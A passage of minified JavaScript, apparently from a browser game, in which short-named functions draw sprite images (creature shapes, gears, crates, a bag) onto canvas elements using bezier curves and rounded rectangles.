      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 119, e * 28);
      n.bezierCurveTo(e * 119, e * 22, e * 119, e * 20, e * 122, e * 16);
      n.bezierCurveTo(e * 149, e * 39, e * 149, e * 39, e * 176, e * 63);
      n.bezierCurveTo(e * 176, e * 75, e * 176, e * 75, e * 175, e * 88);
      n.bezierCurveTo(e * 174, e * 90, e * 174, e * 90, e * 172, e * 93);
      n.bezierCurveTo(e * 171, e * 101, e * 169, e * 109, e * 164, e * 113);
      n.bezierCurveTo(e * 163, e * 104, e * 163, e * 104, e * 162, e * 95);
      n.bezierCurveTo(e * 155, e * 105, e * 155, e * 105, e * 147, e * 116);
      n.bezierCurveTo(e * 87, e * 114, e * 87, e * 114, e * 26, e * 112);
      n.bezierCurveTo(e * 27, e * 106, e * 27, e * 106, e * 27, e * 101);
      n.bezierCurveTo(e * 24, e * 104, e * 24, e * 104, e * 20, e * 108);
      n.bezierCurveTo(e * 17, e * 103, e * 20, e * 86, e * 23, e * 72);
      n.bezierCurveTo(e * 15, e * 74, e * 14, e * 78, e * 12, e * 83);
      n.bezierCurveTo(e * 12, e * 65, e * 12, e * 54, e * 16, e * 42);
      n.bezierCurveTo(e * 14, e * 39, e * 14, e * 39, e * 12, e * 36);
      n.bezierCurveTo(e * 16, e * 33, e * 16, e * 33, e * 19, e * 30);
      n.bezierCurveTo(e * 18, e * 27, e * 18, e * 27, e * 17, e * 25);
      n.bezierCurveTo(e * 24, e * 24, e * 31, e * 21, e * 29, e * 19);
      n.bezierCurveTo(e * 37, e * 25, e * 37, e * 25, e * 45, e * 31);
      n.bezierCurveTo(e * 40, e * 23, e * 40, e * 21, e * 42, e * 16);
      n.bezierCurveTo(e * 74, e * 16, e * 74, e * 16, e * 106, e * 16);
      n.bezierCurveTo(e * 113, e * 21, e * 113, e * 21, e * 119, e * 26);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      return r;
    }
    function Ze(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 191;
      t.height = e * 153;
      r.save();
      r.translate(e * 96.49996948242188, e * 66.79510498046875);
      Be(r, e * -79.5, e * -48.5, e * 159, e * 97, e * 22);
      r.restore();
      ye(r, i[0], i[0], e * 4);
      r.translate(e * 2, 0);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 119, e * 28);
      r.bezierCurveTo(e * 119, e * 22, e * 119, e * 20, e * 122, e * 16);
      r.bezierCurveTo(e * 149, e * 39, e * 149, e * 39, e * 176, e * 63);
      r.bezierCurveTo(e * 176, e * 75, e * 176, e * 75, e * 175, e * 88);
      r.bezierCurveTo(e * 174, e * 90, e * 174, e * 90, e * 172, e * 93);
      r.bezierCurveTo(e * 171, e * 101, e * 169, e * 109, e * 164, e * 113);
      r.bezierCurveTo(e * 163, e * 104, e * 163, e * 104, e * 162, e * 95);
      r.bezierCurveTo(e * 155, e * 105, e * 155, e * 105, e * 147, e * 116);
      r.bezierCurveTo(e * 87, e * 114, e * 87, e * 114, e * 26, e * 112);
      r.bezierCurveTo(e * 27, e * 106, e * 27, e * 106, e * 27, e * 101);
      r.bezierCurveTo(e * 24, e * 104, e * 24, e * 104, e * 20, e * 108);
      r.bezierCurveTo(e * 17, e * 103, e * 20, e * 86, e * 23, e * 72);
      r.bezierCurveTo(e * 15, e * 74, e * 14, e * 78, e * 12, e * 83);
      r.bezierCurveTo(e * 12, e * 65, e * 12, e * 54, e * 16, e * 42);
      r.bezierCurveTo(e * 14, e * 39, e * 14, e * 39, e * 12, e * 36);
      r.bezierCurveTo(e * 16, e * 33, e * 16, e * 33, e * 19, e * 30);
      r.bezierCurveTo(e * 18, e * 27, e * 18, e * 27, e * 17, e * 25);
      r.bezierCurveTo(e * 24, e * 24, e * 31, e * 21, e * 29, e * 19);
      r.bezierCurveTo(e * 37, e * 25, e * 37, e * 25, e * 45, e * 31);
      r.bezierCurveTo(e * 40, e * 23, e * 40, e * 21, e * 42, e * 16);
      r.bezierCurveTo(e * 74, e * 16, e * 74, e * 16, e * 106, e * 16);
      r.bezierCurveTo(e * 113, e * 21, e * 113, e * 21, e * 119, e * 26);
      r.closePath();
      ye(r, i[0], i[0], e * 4);
      r.save();
      r.translate(e * 97.49996948242188, e * 95.12844848632812);
      Be(r, e * -62.5, e * -41.5, e * 125, e * 83, e * 20);
      r.restore();
      ye(r, i[0], i[0], e * 4);
      return t;
    }
    function Qe(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 40;
      var o = e * 40;
      r.width = a;
      r.height = o;
      var s = e * a / 2;
      var _ = e * o / 2;
      var E = e * 15;
      n.save();
      n.translate(s, _);
      n.globalAlpha = 1;
      ze(n, 0, 0, E);
      ye(n, t[0]);
      E = e * 5;
      s = e * 2;
      _ = e * 1;
      n.translate(s, _);
      n.globalAlpha = 1;
      ze(n, 0, 0, E);
      ye(n, t[1]);
      n.restore();
      return r;
    }
    function $e(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      n.width = e * 185;
      n.height = e * 240;
      a.globalAlpha = 0.5;
      a.translate(0, e * 10);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 44, e * 137);
      a.bezierCurveTo(e * 60, e * 87, e * 68, e * 66, e * 92, e * 67);
      a.bezierCurveTo(e * 115, e * 64, e * 129, e * 97, e * 137, e * 136);
      a.closePath();
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 53, e * 181);
      a.bezierCurveTo(e * 30, e * 164, e * 19, e * 150, e * 11, e * 136);
      a.bezierCurveTo(e * 28, e * 121, e * 38, e * 132, e * 48, e * 150);
      a.closePath();
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 63, e * 208);
      a.bezierCurveTo(e * 75, e * 224, e * 86, e * 228, e * 93, e * 228);
      a.bezierCurveTo(e * 104, e * 229, e * 116, e * 219, e * 122, e * 205);
      a.closePath();
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 130, e * 170);
      a.bezierCurveTo(e * 146, e * 125, e * 156, e * 126, e * 173, e * 137);
      a.bezierCurveTo(e * 167, e * 151, e * 143, e * 174, e * 131, e * 183);
      a.closePath();
      ye(a, t[0]);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 39, e * 140);
      a.bezierCurveTo(e * 75, e * 126, e * 113, e * 127, e * 143, e * 137);
      a.bezierCurveTo(e * 141, e * 186, e * 130, e * 202, e * 113, e * 214);
      a.bezierCurveTo(e * 85, e * 228, e * 56, e * 219, e * 48, e * 173);
      a.bezierCurveTo(e * 40, e * 148, e * 43, e * 145, e * 39, e * 140);
      a.closePath();
      ye(a, t[0]);
      a.globalAlpha = 1;
      a.translate(0, e * -10);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 44, e * 137);
      a.bezierCurveTo(e * 60, e * 87, e * 68, e * 66, e * 92, e * 67);
      a.bezierCurveTo(e * 115, e * 64, e * 129, e * 97, e * 137, e * 136);
      a.closePath();
      ye(a, t[1], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 53, e * 181);
      a.bezierCurveTo(e * 30, e * 164, e * 19, e * 150, e * 11, e * 136);
      a.bezierCurveTo(e * 28, e * 121, e * 38, e * 132, e * 48, e * 150);
      a.closePath();
      ye(a, t[1], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 63, e * 208);
      a.bezierCurveTo(e * 75, e * 224, e * 86, e * 228, e * 93, e * 228);
      a.bezierCurveTo(e * 104, e * 229, e * 116, e * 219, e * 122, e * 205);
      a.closePath();
      ye(a, t[1], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 130, e * 170);
      a.bezierCurveTo(e * 146, e * 125, e * 156, e * 126, e * 173, e * 137);
      a.bezierCurveTo(e * 167, e * 151, e * 143, e * 174, e * 131, e * 183);
      a.closePath();
      ye(a, t[1], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 39, e * 140);
      a.bezierCurveTo(e * 75, e * 126, e * 113, e * 127, e * 143, e * 137);
      a.bezierCurveTo(e * 141, e * 186, e * 130, e * 202, e * 113, e * 214);
      a.bezierCurveTo(e * 85, e * 228, e * 56, e * 219, e * 48, e * 173);
      a.bezierCurveTo(e * 40, e * 148, e * 43, e * 145, e * 39, e * 140);
      a.closePath();
      ye(a, t[1], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 59, e * 99);
      a.bezierCurveTo(e * 71, e * 68, e * 81, e * 68, e * 94, e * 67);
      a.bezierCurveTo(e * 105, e * 66, e * 119, e * 75, e * 123, e * 96);
      a.bezierCurveTo(e * 104, e * 91, e * 101, e * 94, e * 94, e * 97);
      a.bezierCurveTo(e * 76, e * 92, e * 73, e * 93, e * 60, e * 99);
      a.closePath();
      ye(a, t[3], t[2], e * 4);
      if (r === 0) {
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 47, e * 149);
        a.bezierCurveTo(e * 43, e * 140, e * 48, e * 130, e * 59, e * 127);
        a.bezierCurveTo(e * 77, e * 126, e * 90, e * 131, e * 131, e * 127);
        a.bezierCurveTo(e * 143, e * 130, e * 144, e * 143, e * 132, e * 154);
        a.bezierCurveTo(e * 90, e * 152, e * 90, e * 152, e * 48, e * 150);
        a.closePath();
        ye(a, t[1]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 40, e * 139);
        a.bezierCurveTo(e * 48, e * 113, e * 76, e * 119, e * 91, e * 126);
        a.bezierCurveTo(e * 117, e * 113, e * 135, e * 117, e * 144, e * 134);
        a.bezierCurveTo(e * 144, e * 138, e * 144, e * 138, e * 144, e * 142);
        a.bezierCurveTo(e * 128, e * 124, e * 108, e * 124, e * 91, e * 136);
        a.bezierCurveTo(e * 59, e * 124, e * 50, e * 137, e * 42, e * 148);
        a.closePath();
        ye(a, t[3], t[2], e * 4);
      } else {
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 41, e * 139);
        a.bezierCurveTo(e * 53, e * 117, e * 69, e * 118, e * 92, e * 127);
        a.bezierCurveTo(e * 124, e * 111, e * 136, e * 121, e * 143, e * 136);
        a.bezierCurveTo(e * 142, e * 144, e * 142, e * 144, e * 141, e * 152);
        a.bezierCurveTo(e * 128, e * 131, e * 113, e * 138, e * 92, e * 145);
        a.bezierCurveTo(e * 57, e * 133, e * 57, e * 147, e * 44, e * 154);
        a.closePath();
        ye(a, t[3], t[2], e * 4);
      }
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 90, e * 95);
      a.bezierCurveTo(e * 99, e * 82, e * 98, e * 58, e * 99, e * 40);
      a.bezierCurveTo(e * 90, e * 38, e * 89, e * 34, e * 92, e * 17);
      a.bezierCurveTo(e * 92, e * 5, e * 83, e * 16, e * 78, e * 29);
      a.bezierCurveTo(e * 72, e * 59, e * 87, e * 81, e * 89, e * 87);
      a.closePath();
      ye(a, t[1], t[2], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 90, e * 86);
      a.bezierCurveTo(e * 95, e * 74, e * 95, e * 62, e * 95, e * 43);
      a.bezierCurveTo(e * 84, e * 37, e * 86, e * 34, e * 89, e * 16);
      a.bezierCurveTo(e * 75, e * 29, e * 80, e * 58, e * 90, e * 85);
      a.closePath();
      ye(a, t[1], t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 92, e * 117);
      a.bezierCurveTo(e * 98, e * 87, e * 93, e * 78, e * 85, e * 76);
      a.bezierCurveTo(e * 85.5, e * 79.5, e * 85.5, e * 79.5, e * 86, e * 83);
      a.bezierCurveTo(e * 84, e * 85.5, e * 84, e * 85.5, e * 82, e * 88);
      a.bezierCurveTo(e * 90, e * 93, e * 89, e * 100, e * 92, e * 117);
      a.closePath();
      ye(a, t[1], t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 92, e * 175);
      a.bezierCurveTo(e * 95, e * 135, e * 98, e * 125, e * 109, e * 121);
      a.bezierCurveTo(e * 106, e * 114, e * 104, e * 114, e * 102, e * 113);
      a.bezierCurveTo(e * 103, e * 106, e * 104, e * 103, e * 107, e * 96);
      a.bezierCurveTo(e * 74, e * 108, e * 86, e * 157, e * 92, e * 174);
      a.closePath();
      ye(a, t[1], t[3], e * 4);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 48, e * 169);
      a.bezierCurveTo(e * 42, e * 187, e * 50, e * 193, e * 59, e * 198);
      a.closePath();
      ye(a, undefined, t[2], e * 5);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 136, e * 171);
      a.bezierCurveTo(e * 139, e * 186, e * 138, e * 191, e * 124, e * 199);
      a.closePath();
      ye(a, undefined, t[2], e * 4);
      ze(a, e * 63, e * 180, e * 15.231546211727817);
      ye(a, t[4]);
      ze(a, e * 121, e * 181, e * 15.652475842498529);
      ye(a, t[4]);
      ze(a, e * 58, e * 175, e * 5.656854249492381);
      ye(a, t[2]);
      ze(a, e * 116, e * 175, e * 5.656854249492381);
      ye(a, t[2]);
      return n;
    }
    function ei(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 185;
      t.height = e * 240;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 44, e * 137);
      r.bezierCurveTo(e * 60, e * 87, e * 68, e * 66, e * 92, e * 67);
      r.bezierCurveTo(e * 115, e * 64, e * 129, e * 97, e * 137, e * 136);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 53, e * 181);
      r.bezierCurveTo(e * 30, e * 164, e * 19, e * 150, e * 11, e * 136);
      r.bezierCurveTo(e * 28, e * 121, e * 38, e * 132, e * 48, e * 150);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 63, e * 208);
      r.bezierCurveTo(e * 75, e * 224, e * 86, e * 228, e * 93, e * 228);
      r.bezierCurveTo(e * 104, e * 229, e * 116, e * 219, e * 122, e * 205);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 130, e * 170);
      r.bezierCurveTo(e * 146, e * 125, e * 156, e * 126, e * 173, e * 137);
      r.bezierCurveTo(e * 167, e * 151, e * 143, e * 174, e * 131, e * 183);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 39, e * 140);
      r.bezierCurveTo(e * 75, e * 126, e * 113, e * 127, e * 143, e * 137);
      r.bezierCurveTo(e * 141, e * 186, e * 130, e * 202, e * 113, e * 214);
      r.bezierCurveTo(e * 85, e * 228, e * 56, e * 219, e * 48, e * 173);
      r.bezierCurveTo(e * 40, e * 148, e * 43, e * 145, e * 39, e * 140);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 90, e * 95);
      r.bezierCurveTo(e * 99, e * 82, e * 98, e * 58, e * 99, e * 40);
      r.bezierCurveTo(e * 90, e * 38, e * 89, e * 34, e * 92, e * 17);
      r.bezierCurveTo(e * 92, e * 5, e * 83, e * 16, e * 78, e * 29);
      r.bezierCurveTo(e * 72, e * 59, e * 87, e * 81, e * 89, e * 87);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 90, e * 86);
      r.bezierCurveTo(e * 95, e * 74, e * 95, e * 62, e * 95, e * 43);
      r.bezierCurveTo(e * 84, e * 37, e * 86, e * 34, e * 89, e * 16);
      r.bezierCurveTo(e * 75, e * 29, e * 80, e * 58, e * 90, e * 85);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 92, e * 117);
      r.bezierCurveTo(e * 98, e * 87, e * 93, e * 78, e * 85, e * 76);
      r.bezierCurveTo(e * 85.5, e * 79.5, e * 85.5, e * 79.5, e * 86, e * 83);
      r.bezierCurveTo(e * 84, e * 85.5, e * 84, e * 85.5, e * 82, e * 88);
      r.bezierCurveTo(e * 90, e * 93, e * 89, e * 100, e * 92, e * 117);
      r.closePath();
      ye(r, i[0]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 92, e * 175);
      r.bezierCurveTo(e * 95, e * 135, e * 98, e * 125, e * 109, e * 121);
      r.bezierCurveTo(e * 106, e * 114, e * 104, e * 114, e * 102, e * 113);
      r.bezierCurveTo(e * 103, e * 106, e * 104, e * 103, e * 107, e * 96);
      r.bezierCurveTo(e * 74, e * 108, e * 86, e * 157, e * 92, e * 174);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function ii(e) {
      var i = document.createElement("canvas");
      var t = i.getContext("2d");
      var r = e * 200;
      var n = e * 200;
      i.width = r;
      i.height = n;
      var a = tt(0.35, false, ["#0e3022", "#0b8052", "#077b49"]);
      t.drawImage(a, 10, 10);
      a = rt(0.9, false, ["#3d2a6e", "#8255b5"]);
      t.drawImage(a, 21, 20);
      a = rt(0.9, false, ["#3d2a6e", "#8255b5"]);
      t.drawImage(a, 38, 28);
      a = rt(0.9, false, ["#3d2a6e", "#8255b5"]);
      t.drawImage(a, 15, 37);
      a = rt(0.9, false, ["#3d2a6e", "#8255b5"]);
      t.drawImage(a, 32, 45);
      return i;
    }
    function ti(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = e * 100;
      var a = e * 100;
      var o = n / 2;
      var s = a / 2;
      t.width = n;
      t.height = a;
      var _ = e * 5;
      var E = e * 28;
      var T = _ / 2;
      var A = E / 2;
      r.translate(o, s);
      for (var d = 0; d < 4; d++) {
        Be(r, -T, -A, _, E, e * 2);
        r.rotate(Math.PI / 4);
        ye(r, i);
      }
      r.arc(0, 0, e * 10, 0, Math.PI * 2);
      ye(r, i);
      r.globalCompositeOperation = "destination-out";
      ze(r, 0, 0, e * 4);
      r.fill();
      return t;
    }
    function ri(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 32;
      var o = e * 32;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      var E = e * 5;
      var T = e * 28;
      var A = E / 2;
      var d = T / 2;
      n.translate(e * 0, e * 0);
      n.translate(s, _);
      if (t == 1) {
        ze(n, 0, 0, e * 10);
        ye(n, i[2], i[2], e * 3);
        for (var h = 0; h < 4; h++) {
          Be(n, -A, -d, E, T, e * 2);
          n.rotate(Math.PI / 4);
          ye(n, i[2], i[2], e * 4);
        }
      }
      ze(n, 0, 0, e * 10);
      ye(n, i[0], i[1], e * 1.5);
      for (h = 0; h < 4; h++) {
        Be(n, -A, -d, E, T, e * 2);
        n.rotate(Math.PI / 4);
        ye(n, i[0], i[1], e * 1.5);
      }
      ze(n, 0, 0, e * 10);
      ye(n, i[0]);
      ze(n, 0, 0, e * 4);
      ye(n, i[2], i[1], e * 1.5);
      n.globalCompositeOperation = "destination-out";
      ze(n, 0, 0, e * 4);
      ye(n, i[0], i[1], e * 2);
      n.globalCompositeOperation = "source-over";
      ze(n, 0, 0, e * 4);
      ye(n, undefined, i[1], e * 2);
      return r;
    }
    function ni(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = (I = e * 125) / 2;
      var o = (u = e * 95) / 2;
      var s = e * 10;
      var _ = e * 8;
      var E = e * 112;
      var T = e * 82;
      var A = E / 2;
      var d = T / 2;
      var h = e * 4;
      r.width = I;
      r.height = u;
      n.translate(a - e * 4, o + e * 4);
      n.globalAlpha = i ? 0.5 : 1;
      Be(n, -A, -d, E, T, s);
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, -_);
      Be(n, -A, -d, E, T, s);
      ye(n, t[1], t[2], h);
      var I = e * 55;
      var u = e * 45;
      s = 5;
      n.translate(e * -40, e * -30);
      Be(n, 0, 0, I, u, s);
      ye(n, t[3]);
      var l = ti(e * 0.7, t[3]);
      n.drawImage(l, e * 45, e * -25);
      l = ti(e * 0.7, t[3]);
      n.drawImage(l, e * 45, e * 15);
      l = ti(e * 1.2, t[3]);
      n.drawImage(l, e * 28, e * -30);
      I = e * 15;
      u = e * 70;
      s = e * 5;
      n.translate(e * 78, e * -5);
      Be(n, 0, 0, I, u, s);
      ye(n, t[4]);
      I = e * 9;
      u = e * 50;
      s = e * 3;
      n.translate(e * -20, e * 20);
      n.rotate(Math.PI / 5);
      n.globalAlpha = 0.6;
      Be(n, 0, 0, I, u, s);
      ye(n, t[5]);
      n.translate(e * -20, e * 29);
      n.rotate(Math.PI / 5);
      n.globalAlpha = 0.6;
      n.beginPath();
      n.lineJoin = "round";
      n.moveTo(0, 0);
      n.lineTo(0, e * 30);
      n.lineTo(e * 30, e * 30);
      n.closePath();
      ye(n, null, t[5], e * 8);
      return r;
    }
    function ai(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = e * 85;
      var a = e * 115;
      var o = e * 6;
      t.width = n;
      t.height = a;
      r.translate(e * -130, e * -60 + o);
      r.globalAlpha = 0.5;
      r.beginPath();
      r.bezierCurveTo(e * 190, e * 87, e * 201, e * 59, e * 208, e * 64);
      r.bezierCurveTo(e * 213, e * 68, e * 204, e * 93, e * 195, e * 109);
      r.bezierCurveTo(e * 195, e * 109, e * 202, e * 124, e * 191, e * 141);
      r.bezierCurveTo(e * 182, e * 151, e * 164, e * 155, e * 148, e * 144);
      r.bezierCurveTo(e * 136, e * 135, e * 138, e * 111, e * 145, e * 104);
      r.bezierCurveTo(e * 140, e * 92, e * 131, e * 67, e * 138, e * 63);
      r.bezierCurveTo(e * 145, e * 61, e * 153, e * 82, e * 155, e * 96);
      r.bezierCurveTo(e * 167, e * 91, e * 178, e * 92, e * 187, e * 98);
      r.closePath();
      ye(r, i[0]);
      r.translate(0, -o);
      r.globalAlpha = 1;
      r.beginPath();
      r.bezierCurveTo(e * 190, e * 87, e * 201, e * 59, e * 208, e * 64);
      r.bezierCurveTo(e * 213, e * 68, e * 204, e * 93, e * 195, e * 109);
      r.bezierCurveTo(e * 195, e * 109, e * 202, e * 124, e * 191, e * 141);
      r.bezierCurveTo(e * 182, e * 151, e * 164, e * 155, e * 148, e * 144);
      r.bezierCurveTo(e * 136, e * 135, e * 138, e * 111, e * 145, e * 104);
      r.bezierCurveTo(e * 140, e * 92, e * 131, e * 67, e * 138, e * 63);
      r.bezierCurveTo(e * 145, e * 61, e * 153, e * 82, e * 155, e * 96);
      r.bezierCurveTo(e * 167, e * 91, e * 178, e * 92, e * 187, e * 98);
      r.closePath();
      ye(r, i[1], i[2], 4);
      var s = e * 155;
      var _ = e * 133;
      var E = e * 10;
      var T = e * 3;
      var A = s + e * -3;
      var d = _ + e * -5;
      r.save();
      r.translate(s, _);
      r.globalAlpha = 1;
      ze(r, 0, 0, E);
      ye(r, i[3]);
      r.restore();
      r.save();
      r.translate(A, d);
      r.globalAlpha = 1;
      ze(r, 0, 0, T);
      ye(r, i[4]);
      r.restore();
      r.save();
      r.translate(s + e * 27, _);
      r.globalAlpha = 1;
      ze(r, 0, 0, E);
      ye(r, i[3]);
      r.restore();
      r.save();
      r.translate(e * 27 + A, d);
      r.globalAlpha = 1;
      ze(r, 0, 0, T);
      ye(r, i[4]);
      return t;
    }
    function oi(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 188;
      t.height = e * 190;
      r.globalAlpha = 0.5;
      r.translate(0, e * 5);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 33.00567626953125, e * 95.44320678710938);
      r.bezierCurveTo(e * 42.00567626953125, e * 87.44320678710938, e * 48.00567626953125, e * 51.443206787109375, e * 74.00567626953125, e * 47.443206787109375);
      r.bezierCurveTo(e * 100.00567626953125, e * 42.443206787109375, e * 118.00567626953125, e * 49.443206787109375, e * 131.00567626953125, e * 55.443206787109375);
      r.bezierCurveTo(e * 140.00567626953125, e * 70.44320678710938, e * 145.00567626953125, e * 87.44320678710938, e * 152.00567626953125, e * 94.44320678710938);
      r.bezierCurveTo(e * 149.00567626953125, e * 99.44320678710938, e * 147.00567626953125, e * 98.44320678710938, e * 141.00567626953125, e * 101.44320678710938);
      r.bezierCurveTo(e * 147.00567626953125, e * 108.44320678710938, e * 147.00567626953125, e * 111.44320678710938, e * 147.00567626953125, e * 112.44320678710938);
      r.bezierCurveTo(e * 143.00567626953125, e * 112.44320678710938, e * 141.00567626953125, e * 112.44320678710938, e * 137.00567626953125, e * 111.44320678710938);
      r.bezierCurveTo(e * 138.00567626953125, e * 117.44320678710938, e * 138.00567626953125, e * 120.44320678710938, e * 138.00567626953125, e * 124.44320678710938);
      r.bezierCurveTo(e * 125.00567626953125, e * 107.44320678710938, e * 121.00567626953125, e * 124.44320678710938, e * 110.00567626953125, e * 141.44320678710938);
      r.bezierCurveTo(e * 102.00567626953125, e * 158.44320678710938, e * 89.00567626953125, e * 158.44320678710938, e * 80.00567626953125, e * 144.44320678710938);
      r.bezierCurveTo(e * 61.00567626953125, e * 111.44320678710938, e * 56.00567626953125, e * 117.44320678710938, e * 48.00567626953125, e * 120.44320678710938);
      r.bezierCurveTo(e * 46.00567626953125, e * 118.44320678710938, e * 47.00567626953125, e * 112.44320678710938, e * 48.00567626953125, e * 107.44320678710938);
      r.bezierCurveTo(e * 43.00567626953125, e * 111.44320678710938, e * 40.00567626953125, e * 111.44320678710938, e * 37.00567626953125, e * 110.44320678710938);
      r.bezierCurveTo(e * 39.50567626953125, e * 104.94320678710938, e * 39.50567626953125, e * 104.94320678710938, e * 42.00567626953125, e * 99.44320678710938);
      r.bezierCurveTo(e * 33.00567626953125, e * 99.44320678710938, e * 33.00567626953125, e * 98.44320678710938, e * 33.00567626953125, e * 96.44320678710938);
      r.closePath();
      ye(r, i[0], i[0], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 60.00567626953125, e * 99.35227966308594);
      r.bezierCurveTo(e * 70.00567626953125, e * 82.35227966308594, e * 85.00567626953125, e * 86.35227966308594, e * 87.00567626953125, e * 97.35227966308594);
      r.bezierCurveTo(e * 89.00567626953125, e * 101.35227966308594, e * 88.00567626953125, e * 105.35227966308594, e * 87.00567626953125, e * 110.35227966308594);
      r.bezierCurveTo(e * 89.00567626953125, e * 111.35227966308594, e * 91.00567626953125, e * 112.35227966308594, e * 93.00567626953125, e * 115.35227966308594);
      r.bezierCurveTo(e * 96.00567626953125, e * 111.35227966308594, e * 99.00567626953125, e * 111.35227966308594, e * 100.00567626953125, e * 110.35227966308594);
      r.bezierCurveTo(e * 98.00567626953125, e * 92.35227966308594, e * 103.00567626953125, e * 86.35227966308594, e * 113.00567626953125, e * 89.35227966308594);
      r.bezierCurveTo(e * 122.00567626953125, e * 92.35227966308594, e * 123.00567626953125, e * 94.35227966308594, e * 126.00567626953125, e * 98.35227966308594);
      r.bezierCurveTo(e * 124.00567626953125, e * 102.35227966308594, e * 123.00567626953125, e * 103.35227966308594, e * 121.00567626953125, e * 104.35227966308594);
      r.bezierCurveTo(e * 124.00567626953125, e * 105.35227966308594, e * 126.00567626953125, e * 107.35227966308594, e * 129.00567626953125, e * 111.35227966308594);
      r.bezierCurveTo(e * 115.00567626953125, e * 122.35227966308594, e * 113.00567626953125, e * 145.35227966308594, e * 100.00567626953125, e * 152.35227966308594);
      r.bezierCurveTo(e * 91.00567626953125, e * 158.35227966308594, e * 83.00567626953125, e * 149.35227966308594, e * 76.00567626953125, e * 138.35227966308594);
      r.bezierCurveTo(e * 67.00567626953125, e * 114.35227966308594, e * 63.00567626953125, e * 113.35227966308594, e * 59.00567626953125, e * 111.35227966308594);
      r.bezierCurveTo(e * 62.00567626953125, e * 107.35227966308594, e * 64.00567626953125, e * 105.35227966308594, e * 66.00567626953125, e * 104.35227966308594);
      r.bezierCurveTo(e * 63.00567626953125, e * 100.35227966308594, e * 62.00567626953125, e * 100.35227966308594, e * 60.00567626953125, e * 99.35227966308594);
      r.closePath();
      ye(r, i[0], i[0], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 51.00567626953125, e * 72.53409576416016);
      r.bezierCurveTo(e * 48.00567626953125, e * 56.534095764160156, e * 48.00567626953125, e * 49.534095764160156, e * 54.00567626953125, e * 35.534095764160156);
      r.bezierCurveTo(e * 58.00567626953125, e * 26.534095764160156, e * 65.00567626953125, e * 27.534095764160156, e * 73.00567626953125, e * 40.534095764160156);
      r.bezierCurveTo(e * 81.00567626953125, e * 49.534095764160156, e * 82.00567626953125, e * 50.534095764160156, e * 83.00567626953125, e * 51.534095764160156);
      r.bezierCurveTo(e * 77.00567626953125, e * 71.53409576416016, e * 64.00567626953125, e * 75.53409576416016, e * 51.00567626953125, e * 72.53409576416016);
      r.closePath();
